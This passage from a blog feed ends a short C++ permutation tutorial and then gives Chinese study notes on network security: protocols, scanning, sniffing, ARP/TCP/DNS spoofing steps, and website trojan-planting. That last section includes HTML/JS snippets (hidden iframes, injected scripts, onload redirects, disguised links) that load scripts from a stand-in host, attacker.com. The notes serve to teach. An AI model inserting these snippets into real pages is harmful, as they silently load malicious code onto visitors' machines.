+&lt;p&gt;STL中的algorithm头文件中提供了两个函数&lt;code&gt;next_permutation(begin,end)&lt;/code&gt;和&lt;code&gt;prev_permutation(begin,end)&lt;/code&gt;分别提供区间$[begin,end)$中元素的下一个排列和上一个排列（按字典序），当没有可用排列时返回0&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;P1706 全排列问题&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;本题已经用递归做过一次，但是用现在的排列枚举会更简单&lt;/p&gt;
+&lt;p&gt;由于$1,2,3,\dots,n$的排列就是字典序最小的排列，故从这里开始循环调用&lt;code&gt;next_permutation(begin,end)&lt;/code&gt;就可以保证枚举 所有排列&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;cstdio&amp;gt;
+#include&amp;lt;algorithm&amp;gt;
+
+int main()
+{
+    int ans[10];
+    int n;
+    scanf(&quot;%d&quot;,&amp;amp;n);
+    for(int i = 0;i &amp;lt; n; i++)
+    {
+        ans[i]=i+1;
+    }
+    do
+    {
+        for(int i = 0;i &amp;lt; n; i++)
+            printf(&quot;%5d&quot;,ans[i]);
+        printf(&quot;%c&quot;,&apos;&apos;);
+    }while(std::next_permutation(ans,ans+n));
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题1 P1088 火星人&lt;/p&gt;
+&lt;p&gt;例题2 P1014 Cantor表&lt;/p&gt;
+&lt;p&gt;例题3 P1469 找筷子&lt;/p&gt;
+&lt;/blockquote&gt;
+</content:encoded></item><item><title>计算机网络安全技术</title><link>https://ssl.ztsubaki.xyz/posts/2/2/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/2/2/</guid><description>刑</description><pubDate>Sun, 16 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;计算机网络基础&lt;/h2&gt;
+&lt;h3&gt;TCP/IP协议架构&lt;/h3&gt;
+&lt;p&gt;TCP/IP(Transmission Control Protocol/Internet Protocol，传输控制协议/网际协议)1973年由斯坦福大学的文顿·瑟夫与卡恩提出，是一系列以TCP协议、IP协议为中心的协议组成的协议簇，它定义了一套数据在通信介质中传输的统一标准和规范，是全球网络中最广泛成熟的网络协议标准，我们目前使用的网络均是基于此标准的。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;TCP/IP模型&lt;/p&gt;
+&lt;p&gt;TCP/IP体系结构包括四层，从下往上依次为物理和数据链路层、网络层、传输层、应用层。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;物理和数据链路层&lt;/p&gt;
+&lt;p&gt;定义了网络中设备链接时各种介质的物理链接特性以及数据在不同介质上的信息帧格式，实现在物理链路上无差错的传送数据帧，对应OSI/RM参考模型中的物理层和数据链路层。&lt;/p&gt;
+&lt;p&gt;其内容包括各种广域网(Internet、ATM、X.25公共数据网)、各种局域网(Ethernet、各种IEEE标准局域网等)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络层&lt;/p&gt;
+&lt;p&gt;提供数据分组传输、路由选择和网络管理的功能，以实现网络中点对点传输路径的寻址和联通。是TCP/IP中最重要的一层，对应OSI/RM参考模型中的网络层。&lt;/p&gt;
+&lt;p&gt;其内容包括用于数据传输的IP协议、用于网络管理的SNMP协议、用于故障诊断ICMP协议、用于路由选择的RIP、OSPF等协议&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;传输层&lt;/p&gt;
+&lt;p&gt;负责提供源主机应用程序和目标主机应用程序之间数据的端到端传输服务，对应OSI/RM参考模型中的传输层&lt;/p&gt;
+&lt;p&gt;其内容包括TCP协议和UDP协议&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;应用层&lt;/p&gt;
+&lt;p&gt;应用层包含了面向用户提供管理和网络服务的高层应用服务协议，对应OSI/RM参考模型中的应用层、表示层、会话层&lt;/p&gt;
+&lt;p&gt;其内容包括FTP、HTTP、SMTP/POP3、DNS 、Telnet协议等&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;网络协议&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;物理和数据链路层协议&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;以太网/Ethernet&lt;/p&gt;
+&lt;p&gt;以太网是一种计算机局域网技术，由IEEE组织的IEEE 802.3组织制定，是应用最普遍的局域网技术&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;APR&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;MAC地址&lt;/p&gt;
+&lt;p&gt;工作在网络层中的设备，可以通过IP地址识别数据包发送的源主机和目标主机。而数据包在实际的物理网络中传输时，主机和交换机则是通过MAC(Media Access Control Address，媒体存取控制位址)地址进行源主机和目标主机的交换和识别的&lt;/p&gt;
+&lt;p&gt;MAC地址在网络设备出厂时就被生产商设定，具有全球唯一性。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ARP&lt;/p&gt;
+&lt;p&gt;作为主机或网络设备中的唯一标识，物理网络中的数据帧都必须包含源主机和目标主机的MAC地址才能送达，在不知道目标主机的MAC地址时，就需要事先通过ARP(Address Resolution Protocol,地址解析协议)获取&lt;/p&gt;
+&lt;p&gt;每台计算机内存中会保存一个ARP缓存表(可通过&lt;code&gt;arp -a&lt;/code&gt;查看)，其内容是动态更新的，如果目标主机的MAC地址未知，就需要通过ARP协议进行地址解析来获取&lt;/p&gt;
+&lt;p&gt;解析时，源主机会在局域网中广播ARP Request数据包，询问目标IP地址的MAC地址，对应IP的主机收到后会响应ARP Reply数据包给源主机、告诉源主机自己的IP地址，接下来双方将对方MAC地址加入APR缓存表，两者便可通过MAC地址正常通信了&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络层协议&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;IP协议&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;IP协议可以实现跨域不同网络的主机间通信，目前分为IPv4和IPv6两个版本&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;IP地址&lt;/p&gt;
+&lt;p&gt;IP协议中的主机通过IP地址进行标识。网络中的每台计算机或网络接口都有一个唯一的全局IP地址。IPv4的地址是一个32位二进制数，表示时分成4组用.隔开，每组8位最大值为255，分为网络号和主机号两部分。IPv6则提供128位二进制地址，表示时分成八组用:隔开，每组16位用十六进制数表示&lt;/p&gt;
+&lt;p&gt;尽管大部分网络设备已支持IPv6，但IPv4协议依然是目前使用最广泛的版本。IPv4中定义了几个特殊IP&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;主机号全0 网络地址：表示一个网络的本网络地址(192.168.1.0)&lt;/li&gt;
+&lt;li&gt;主机号全1 直接广播地址：表示特定网络中的所有设备(192.168.1.255)&lt;/li&gt;
+&lt;li&gt;全1 受限广播地址：表示本网络中的所有设备(255.255.255.255)&lt;/li&gt;
+&lt;li&gt;自环地址：表示本设备(127.0.0.1)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;IP地址由ICANN(The Internet Corporation for Assigned Names and Numbers,互联网名称与数字地址分配机构)动态分配，国内由工信部直属CNNIC(China Internet Network Information Center，中国互联网信息中心)行使职权&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ICMP协议&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在复杂网络环境中需要一套机制用于网络异常状态的检测和诊断。ICMP(Internet Control Message Protocol,Internet控制报文协议)的作用便是在TCP/IP网络中发送出错和控制消息，允许主机或网络设备报告差错或异常情况，从而提供一个错误侦测与反馈机制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;传输层协议&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;TCP协议&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;TCP(Transmission Control Protocol,传输控制协议)是一种广泛使用的、面向连接的、可靠的传输层协议，通过握手机制、滑动窗口控制流机制以及确认及超时重传机制实现了端到端的可靠连接&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;三次握手&lt;/p&gt;
+&lt;p&gt;TCP是面向连接的协议，它要先建立连接才能进行数据传输。在连接的建立是通过三次握手机制实现的&lt;/p&gt;
+&lt;p&gt;TCP数据包中包含了一个一位的SYN标志位、一位的ACK标志位、一个32位的序号、一个32位的确认号用于建立连接&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;第一次握手&lt;/p&gt;
+&lt;p&gt;源主机向目标主机发送一个SYN标志位为1，数据包序号SEQ为x的数据包，表示请求连接&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;第二次握手&lt;/p&gt;
+&lt;p&gt;目标主机返回一个SYN、ACK标志位均为1的数据包，并将序号SEQ设为y，确认号设为x+1，表示同意建立连接&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;第三次握手&lt;/p&gt;
+&lt;p&gt;源主机收到同意连接的数据包后，向目标主机发送一个ACK标志位为1，序号SEQ为x+1，确认号为y+1的数据包，至此TCP连接建立&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;UDP协议&lt;/p&gt;
+&lt;p&gt;UDP(User Datagram Protocol,用户数据报协议)是一个面向无连接的、不可靠的传输协议。相比TCP，UDP无需建立连接就可以直接传输数据，因而在传输速度上优于TCP，主要用于流媒体播放等网络要求高而不要求100%送达的场景&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;应用层协议&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;HTTP协议&lt;/p&gt;
+&lt;p&gt;HTTP(Hypertext Transfer Protocol,超文本域传输协议)是Web服务的核心协议，交互过程基于C/S模式，在传输层基于TCP协议，在80端口对外提供服务，目前由WWW联盟的IETF(Internet Engineering Task Force)小组负责完善和发布&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;SMTP/POP3协议&lt;/p&gt;
+&lt;p&gt;SMTP(Simple Mail Transfer Protocol,简单邮件传输协议)主要作用是将电子邮件发送到邮件服务器，是电子邮件系统中的重要协议，基于TCP协议，在25端口提供服务&lt;/p&gt;
+&lt;p&gt;POP3(Post Office Protocol 3,邮局协议第三版)定义了计算机连接到邮件服务器并下载电子邮件的规范，是应用最广范的邮件访问协议&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DNS&lt;/p&gt;
+&lt;p&gt;DNS(Domain Name System,域名系统)主要作用是将Internet中的相对容易记忆的域名解析成难以记忆的相应IP地址，配置并支持DNS功能的服务器称为DNS服务器&lt;/p&gt;
+&lt;p&gt;DNS域名系统采用层次化命名的方式，一个域由若干子域构成，整个结构可以用树形图表示，顶级域是树形图的根节点，下面是一些一级域名，包括通用域.com、.edu、.gov、.net、.org等和每个国家或地区都有一个的国家域.cn、.en、.uk、.jp、.hk等&lt;/p&gt;
+&lt;p&gt;DNS解析的过程首先由用户计算机上的DNS客户端发起，本地DNS服务器接到请求后首先查看缓存，如果有则返回，如果没有则向根域名服务器请求另一个根的子域的的域名服务器地址并重复这一步直到找到解析记录，再将该记录放入缓存并返回给DNS客户端&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;网络安全威胁技术&lt;/h2&gt;
+&lt;h3&gt;扫描技术&lt;/h3&gt;
+&lt;p&gt;扫描技术是实施网络攻击前的必要的信息收集步骤，可以获取攻击目标的IP、端口、操作系统、存在的漏洞等必要信息，为实施下一步攻击做好准备&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;互联网信息收集&lt;/p&gt;
+&lt;p&gt;在当今这个互联网异常发达的时代，通过互联网可以得到目标计算机大量的外围信息，如通过Whois查询域名注册的相关信息、通过搜索引擎查找敏感信息等&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;IP地址扫描(ICMP)&lt;/p&gt;
+&lt;p&gt;IP地址扫描主要发生在网络攻击开始阶段，用于获取目标计算机及其外围网络的网段和对应网段中处于开机状态的设备。可以通过&lt;code&gt;ping&lt;/code&gt;命令发布用于诊断网络的ICMP探测数据包echo request，如果目标IP可用将返回一个ICMP应答包echo replay，后续便可对此IP展开攻击。也可使用专用工具(Nmap、SuperScan)等进行扫描，原理大致相同&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络端口扫描(TCP/UDP)&lt;/p&gt;
+&lt;p&gt;传输层TCP协议和UDP协议定义了一个计算机与计算机之间通信的虚拟信道叫端口(Port)，其范围为0~65535，TCP协议中通过套接字(Socket)建立连接，套接字采用[IP:Port]形式定义，一个套接字对应一个主机上的一个网络服务进程。因此，利用端口扫描便可判断出目标计算机中正在运行的网络服务进程，常用Nmap、SuperScan、Netcat等软件进行&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;TCP全连接扫描&lt;/p&gt;
+&lt;p&gt;TCP全连接扫描利用三次握手机制建立连接来探测目标主机的网络端口是否处于打开状态，但这种扫描会是源主机与目标主机的TCP连接处于ESTABLISHED状态，所以容易被检测出来&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TCP SYN扫描&lt;/p&gt;
+&lt;p&gt;TCP SYN扫描也称TCP半连接扫描，它利用三次握手机制前两次来探测目标端口是否打开，由于没有正常建立连接，所以降低了被发现的可能，也提高了扫描性能&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TCP FIN扫描&lt;/p&gt;
+&lt;p&gt;TCP FIN扫描采用发送FIN标志位位1的数据包给目标端口的方式，如果端口关闭，目标主机将返回一个RST标志位为1的数据包，否则不返回数据，以此判断目标端口是否开放。由于没有采用三次握手机制，TCP FIN扫描比前两者更为隐秘，但在一些操作系统，如Windows NT中无论端口是否开放都会返回数据包，这种方法就不适用了&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;UDP ICMP端口不可达扫描&lt;/p&gt;
+&lt;p&gt;UDP的ICMP端口不可达扫描利用UDP协议中向一个未打开端口发送UDP数据包会返回一个ICMP_PORT_UNREACHABLE错误的ICMP数据包的特性，根据是否收到该数据包就能判断UDP端口是否开启&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;漏洞扫描&lt;/p&gt;
+&lt;p&gt;获取目标主机IP和端口之后下一步就要检测目标主机和网络中存在的安全漏洞以进行入侵，漏洞扫描分为网络漏洞扫描和主机漏洞扫描两种&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;网络漏洞扫描&lt;/p&gt;
+&lt;p&gt;网络漏洞扫描工具针对网络中的主机和设备发送漏洞探测数据包进行扫描，其内部一般配置大量漏洞的模拟攻击脚本和代码，通过运行这些脚本和代码来判断目标主机是否存在对应漏洞，常用Nessus、X-Scan软件进行网络漏洞扫描&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主机漏洞扫描&lt;/p&gt;
+&lt;p&gt;主机漏洞扫描工具针对本机通过漏洞特征匹配技术和补丁安装信息的检测来进行操作系统和应用软件的漏洞检测。常用Nessus软件进行主机漏洞扫描&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;弱口令扫描&lt;/p&gt;
+&lt;p&gt;弱口令扫描是通过扫描得到可远程登录的服务器的相关用户名、口令的技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;字典攻击&lt;/p&gt;
+&lt;p&gt;字典攻击通过事先构造常用口令进行匹配来破解口令，这些常用口令大多是其它服务器已泄漏的用户口令和一些常用单词、数字、字符串组合，因而效率较高，但无法破解所有口令&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;穷举攻击&lt;/p&gt;
+&lt;p&gt;穷举攻击通过构造所有可能的口令进行匹配来破解口令，穷举攻击在有限时间内必定能破解口令，但所用时间太长、效率太低，所以常与字典攻击搭配使用来进行弱口令扫描&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;网络嗅探&lt;/h3&gt;
+&lt;p&gt;正常情况下。网络接口只能接受目标MAC地址为自身MAC地址的数据帧，但网络嗅探工具会将网络端口设为“混杂”(Promiscuous)模式，使其能接受同一物理网络中的所有数据帧，达到监听整个物理网络的效果&lt;/p&gt;
+&lt;p&gt;通过网络嗅探可以获得目标计算机传输的大量信息，是一种威胁极大的信息获取攻击技术&lt;/p&gt;
+&lt;p&gt;网络嗅探分为硬件与软件两种，软件嗅探工具特定条件下无法抓取到所有数据帧，硬件嗅探工具价格往往比较昂贵，攻击者常用网络嗅探软件和木马中的网络嗅探功能进行对目标主机传输数据的嗅探和分析&lt;/p&gt;
+&lt;h3&gt;网络协议欺骗&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;IP地址欺骗&lt;/p&gt;
+&lt;p&gt;IP地址欺骗是指网络攻击者伪造第三方的IP地址给被目标主机发送含伪造IP地址的数据包进行欺骗的行为，由于TCP/IP中缺乏对发送方的认证手段，所以攻击者可以轻易进行IP地址欺骗，但由于目标主机返回的数据包中目标地址为伪造的IP地址，攻击者无法接受到，所以IP地址欺骗单独攻击造成影响不大，常与其它攻击方式配合使用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ARP欺骗&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ARP欺骗利用ARP协议对物理网络中的目标设备发送ARP数据包试其建立错误的IP与MAC地址对应关系达到欺骗的目的&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;中间人欺骗攻击&lt;/p&gt;
+&lt;p&gt;假设局域网环境中有AB两台计算机，攻击者可以向A发送伪造的ARP数据包，将A的ARP缓存表中B的IP对应MAC地址更改为攻击者的MAC地址，同时向B发送伪造的ARP数据包将B的ARP缓存表中A的IP对应MAC地址更改为攻击者MAC地址，这样AB间通信的数据包都将发送给攻击者，攻击者再对二者数据包进行转发，便能达到获取AB正常通信中的所有数据包的效果&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;伪装网关欺骗攻击&lt;/p&gt;
+&lt;p&gt;当局域网中的设备想与外界通信时，要将数据帧目标MAC地址设为网关MAC地址，再由网关转发到外网。因此，攻击者可以利用伪造ARP数据包将局域网中所有主机的网关IP对应的MAC地址改为攻击者的MAC地址，再由攻击者将数据帧转发给网关以达到获取局域网向外界发送的所有数据包的目的&lt;/p&gt;
+&lt;p&gt;当网关IP对应一个不存在的MAC地址时，局域网内便无法与外界进行通信，这也是ARP病毒发作时能瘫痪和中断网络通信的原理&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TCP欺骗&lt;/p&gt;
+&lt;p&gt;TCP欺骗指攻击者 在伪造第三方IP的条件下，将数据加载到基于TCP协议传输的应用数据包中发送到目标主机，以实现使目标主机与第三方主机传输数据泄漏或者造成数据被破坏的攻击&lt;/p&gt;
+&lt;p&gt;TCP协议中采用基于序列号的确认重传机制确保数据包传输可靠。TCP欺骗过程中，当攻击者冒充A主机与B主机建立TCP连接时，攻击者无法接受B主机返回给A主机的数据包，因而需要推断B主机第二次握手时产生的初始序列号来建立连接&lt;/p&gt;
+&lt;p&gt;TCP初始序列号常用生成方法有三种，一种是64K规则，即在原有序列号上增加常量64000作为新的序列号；一种是依据时间生成序列号；另一种是直接用伪随机数作为序列号&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;非盲攻击&lt;/p&gt;
+&lt;p&gt;非盲攻击指B主机与攻击者在同一物理网络下，攻击者可利用网络嗅探技术获得B主机发送给A的数据包。非盲攻击分为5步&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;攻击者确定A主机离线或使用其它手段(DDoS、ARP欺骗等)使A无法正常接受B发送的数据包&lt;/li&gt;
+&lt;li&gt;攻击者使用A主机的IP地址向B主机发送第一次握手数据包&lt;/li&gt;
+&lt;li&gt;B主机向A主机发送回应的第二次握手数据包，其中包含B主机产生的初始序列号，而此时A主机处于瘫痪状态无法正常接收并返回数据包，攻击者此时可利用网络嗅探技术获得该数据包，并得到其中的序列号&lt;/li&gt;
+&lt;li&gt;攻击者利用得到的序列号冒充A主机向B主机返回第三次握手数据包，至此TCP连接建立&lt;/li&gt;
+&lt;li&gt;连接建立后，攻击者便可以冒充A主机向B主机发送伪造的数据包了&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;盲攻击&lt;/p&gt;
+&lt;p&gt;盲攻击指B主机与攻击者不在同一物理网络的情况下，攻击者无法获得B主机发送给A主机的数据包&lt;/p&gt;
+&lt;p&gt;盲攻击的步骤与非盲攻击相似，区别在第3步无法获得B主机返回的第二次握手数据包，需利用算法预测B主机生成的初始序列号以及第5步中无法获得B主机返回的数据包，无法进行双向通讯，因此盲攻击难度较大&lt;/p&gt;
+&lt;p&gt;盲攻击过程中也可使用路由欺骗技术(ARP欺骗)将B返回的数据包路由到攻击者上以提高成功率&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DNS欺骗&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;基于DNS服务器的欺骗&lt;/p&gt;
+&lt;p&gt;基于DNS服务器的DNS欺骗对象为DNS服务器。攻击者先向目标DNS服务器发送域名地址查询请求，DNS服务器在没有该域名缓存的情况下会向高级DNS服务器发出请求，此时攻击者便可以伪造高级DNS服务器返回伪造的解析记录以此将伪造的解析记录存入目标DNS服务器，接下来用户向该DNS服务器查询该域名时便会返回攻击者伪造的IP地址了&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;基于用户计算机的欺骗&lt;/p&gt;
+&lt;p&gt;基于用户计算机的DNS欺骗对象为DNS服务器。攻击者可以利用目标计算机网络内感染ARP病毒的主机冒充网关拦截目标主机向外网的DNS服务器发出的DNS询问请求，并返回伪造数据而达到对目标主机的DNS欺骗的目的&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;诱骗式攻击&lt;/h3&gt;
+&lt;p&gt;诱骗攻击指通过伪造合成的具有高迷惑性的信息，诱骗用户进行访问，从而诱导用户触发恶意代码或者骗取被攻击者的敏感信息，达到攻击者入侵系统获取敏感信息的目的&lt;/p&gt;
+&lt;p&gt;网络协议欺骗是攻击者利用网络协议设计的机制缺陷主动发起的攻击，而诱骗式攻击则利用社会工程中的欺骗技术诱骗用户实施攻击&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;网站挂马&lt;/p&gt;
+&lt;p&gt;网站挂马是指网站中的网页被攻击者恶意修改后，添加了可以触发并下载恶意程序的链接以及恶意代码和脚本。当用户访问这些网站时，如果自身计算机的Web浏览器及插件中存在安全漏洞，那么这些安全漏洞就会被网页中的恶意代码和脚本进行利用，最终在用户不知情的情况下，使用户自动访问网页中的恶意链接甚至自动下载木马病毒&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;框架挂马&lt;/p&gt;
+&lt;p&gt;框架挂马利用网页中隐藏的iframe框架，在打开网页时打开对应的恶意网页或执行恶意脚本，是最早的一种有效挂马方式&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;iframe src=&quot;http://attacker.com/attackScript.html&quot; width=0 height=0&amp;gt;&amp;lt;/iframe&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+ &amp;lt;script src=&quot;attrackScript.js&quot; &amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;js脚本挂马&lt;/p&gt;
+&lt;p&gt;js脚本挂马指将网页木马的代码写入到js脚本文件中，利用用户打开网页时js脚本文件被调用的方法使js脚本中的网页木马被隐蔽执行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//with iframe
+document.write(&quot;&amp;lt;iframe src=\&quot;http://attacker.com/attackScript.html\&quot; width=0 height=0&amp;gt;&amp;lt;/iframe&amp;gt;&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;//directly with JavaScript
+document.write(&quot;&amp;lt;script src=\&quot;attrackScript.js\&quot; &amp;gt;&amp;lt;/script&amp;gt;&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;body挂马&lt;/p&gt;
+&lt;p&gt;body挂马是指通过HTML文件的body标记添加恶意网页地址，从而进行挂马的技术&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;body onload=&quot;window.location=\&amp;amp;quot http://attacker.html.com/attackScript.html\&amp;amp;quot&quot;&amp;gt;&amp;lt;/body&amp;gt;
+
+
+&amp;lt;body onload=&quot;document.write(&amp;amp;quot &amp;lt;iframe src=\&amp;amp;quot http://attacker.com/attackScript.html\&amp;amp;quot width=0 height=0&amp;gt;&amp;lt;/iframe&amp;gt; &amp;amp;quot);&quot;&amp;gt;&amp;lt;/body&amp;gt;
+&amp;lt;body onload=&quot;document.write(&amp;amp;quot&amp;lt;script src=\&amp;amp;quot attrackScript.js\&amp;amp;quot &amp;gt;&amp;lt;/script&amp;gt;&amp;amp;quot);&quot;&amp;gt;&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;伪装欺骗挂马&lt;/p&gt;
+&lt;p&gt;伪装欺骗挂马指在网页中的某些图片、链接等特定位置处嵌入含有恶意网址的链接代码，从而实现用户点击网页中的图片、链接等特定位置时实现访问恶意网站的目的&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;图片伪装&lt;/p&gt;
+&lt;p&gt;图片伪装指用户点击网页中的图片后在图片打开之前执行恶意代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;2.jpg&quot; onclick=&quot;window.location=&amp;amp;quot http://attacker.com/attackScript.html &amp;amp;quot;&quot;&amp;gt;&amp;lt;/img&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;调用伪装&lt;/p&gt;
+&lt;p&gt;调用伪装利用frameset(HTML5已废弃)实现在调用某个链接之后运行隐藏框架中的内容&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;frameset rows=&quot;100px,0&quot;&amp;gt;
+    &amp;lt;iframe src=&quot;www.baidu.com&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+    &amp;lt;iframe src=&quot;attracker.com/attrackScript.html&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/frameset&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网页链接伪装&lt;/p&gt;
+&lt;p&gt;网页链接伪装指在网页中伪装一个可信网址的地址链接，用户点击后实际链接到一个载有木马的网页&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;a onMouseOver=&quot;www_baidu_com();return true;&quot; href=&quot;http://www.baidu.com&quot; &amp;gt;baidu&amp;lt;/a&amp;gt;
+&amp;lt;script&amp;gt;
+function www_baidu_com(){
+    open(&quot;http://attracker.com/attrackScript.html&quot;,&quot;newwindow&quot;,&quot;width=400,height=400,top=200,left=200,scrollbars=0,toolbar=no,location=no,status=no&quot;);
+}
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;诱骗下载&lt;/p&gt;
+&lt;p&gt;诱骗下载指攻击者将木马病毒与图片、flash动画、文本文件、应用软件等多种格式的文件进行捆绑，将捆绑后的文件配以迷惑性或欺骗性的文件名在网络中发布散播以诱使用户点击下载，用户点击后不仅打开了正常的图片、flash文件、文本文件和应用软件，同时也释放了其中的木马病毒&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;文件捆绑技术&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;多文件捆绑方式&lt;/p&gt;
